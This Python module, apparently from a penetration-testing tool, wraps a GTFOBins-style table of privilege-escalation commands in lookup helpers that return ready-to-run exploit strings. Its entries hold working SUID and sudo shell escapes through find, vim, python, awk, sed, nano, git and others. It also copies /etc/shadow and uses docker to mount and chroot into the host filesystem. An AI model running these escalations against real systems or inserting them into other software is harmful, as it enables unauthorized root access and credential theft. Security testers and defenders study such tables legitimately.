"""
GTFOBins Database Integration
Lookup and exploitation technique reference for SUID/sudo abuse
"""

from typing import Dict, List, Optional
import json
import os


class GTFOBins:
    """Interface to GTFOBins database for privilege escalation techniques"""

    # Core GTFOBins data - most commonly exploited binaries
    GTFOBINS_DATA = {
        'nmap': {
            'name': 'nmap',
            'suid': ['nmap --interactive', 'nmap --script=<(echo "os.execute(\'/bin/sh\')")'],
            'sudo': ['sudo nmap --interactive', '!sh'],
            'description': 'Network mapper with interactive mode leading to shell'
        },
        'vim': {
            'name': 'vim',
            'suid': ['vim -c \':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\''],
            'sudo': ['sudo vim -c \':!sh\'', 'sudo vim -c \':set shell=/bin/sh:shell\''],
            'description': 'Text editor with command execution capabilities'
        },
        'find': {
            'name': 'find',
            'suid': ['find . -exec /bin/sh -p \\; -quit'],
            'sudo': ['sudo find . -exec /bin/sh \\; -quit'],
            'description': 'File search utility with exec parameter'
        },
        'bash': {
            'name': 'bash',
            'suid': ['bash -p'],
            'sudo': ['sudo bash'],
            'description': 'Shell interpreter, -p preserves SUID privileges'
        },
        'python': {
            'name': 'python',
            'suid': ['python -c \'import os; os.execl("/bin/sh", "sh", "-p")\''],
            'sudo': ['sudo python -c \'import os; os.system("/bin/sh")\''],
            'description': 'Python interpreter with OS command execution'
        },
        'perl': {
            'name': 'perl',
            'suid': ['perl -e \'exec "/bin/sh";\''],
            'sudo': ['sudo perl -e \'exec "/bin/sh";\''],
            'description': 'Perl interpreter with command execution'
        },
        'less': {
            'name': 'less',
            'suid': ['less /etc/profile', '!/bin/sh'],
            'sudo': ['sudo less /etc/profile', '!/bin/sh'],
            'description': 'Pager with command execution via !'
        },
        'more': {
            'name': 'more',
            'suid': ['more /etc/profile', '!/bin/sh'],
            'sudo': ['sudo more /etc/profile', '!/bin/sh'],
            'description': 'Pager with command execution'
        },
        'awk': {
            'name': 'awk',
            'suid': ['awk \'BEGIN {system("/bin/sh")}\''],
            'sudo': ['sudo awk \'BEGIN {system("/bin/sh")}\''],
            'description': 'Text processing with system() function'
        },
        'sed': {
            'name': 'sed',
            'suid': ['sed -n \'1e exec sh 1>&0\' /etc/hosts'],
            'sudo': ['sudo sed -n \'1e exec sh 1>&0\' /etc/hosts'],
            'description': 'Stream editor with e command for execution'
        },
        'nano': {
            'name': 'nano',
            'suid': ['nano', '^R^X', 'reset; sh 1>&0 2>&0'],
            'sudo': ['sudo nano', '^R^X', 'reset; sh 1>&0 2>&0'],
            'description': 'Text editor with read command execution'
        },
        'cp': {
            'name': 'cp',
            'suid': ['LFILE=/etc/shadow', 'TF=$(mktemp)', 'cp "$LFILE" "$TF"'],
            'sudo': ['sudo cp /etc/shadow /tmp/shadow'],
            'description': 'Copy files to read sensitive data'
        },
        'docker': {
            'name': 'docker',
            'sudo': ['sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh'],
            'description': 'Container runtime with host filesystem access'
        },
        'git': {
            'name': 'git',
            'sudo': ['sudo git -p help config', '!/sh'],
            'description': 'Version control with pager command execution'
        }
    }

    @classmethod
    def lookup(cls, binary_name: str) -> Optional[Dict]:
        """
        Look up exploitation technique for a binary

        Args:
            binary_name: Name of the binary to look up

        Returns:
            Dictionary with exploitation info or None if not found
        """
        # Extract base binary name from path
        base_name = os.path.basename(binary_name).lower()

        # Check for exact match
        if base_name in cls.GTFOBINS_DATA:
            return cls.GTFOBINS_DATA[base_name]

        # Check for partial matches (e.g., python3 -> python)
        for key in cls.GTFOBINS_DATA.keys():
            if key in base_name or base_name.startswith(key):
                return cls.GTFOBINS_DATA[key]

        return None

    @classmethod
    def is_exploitable(cls, binary_name: str, method: str = 'suid') -> bool:
        """
        Check if a binary is exploitable via given method

        Args:
            binary_name: Name of the binary
            method: 'suid' or 'sudo'

        Returns:
            True if exploitable, False otherwise
        """
        entry = cls.lookup(binary_name)
        if entry and method in entry:
            return True
        return False

    @classmethod
    def get_exploit_command(cls, binary_name: str, method: str = 'suid') -> Optional[str]:
        """
        Get the exploitation command for a binary

        Args:
            binary_name: Name of the binary
            method: 'suid' or 'sudo'

        Returns:
            Exploitation command or None
        """
        entry = cls.lookup(binary_name)
        if entry and method in entry:
            commands = entry[method]
            if isinstance(commands, list):
                return commands[0]  # Return first command
            return commands
        return None

    @classmethod
    def get_all_dangerous_binaries(cls) -> List[str]:
        """
        Get list of all known dangerous binaries

        Returns:
            List of binary names
        """
        return list(cls.GTFOBINS_DATA.keys())
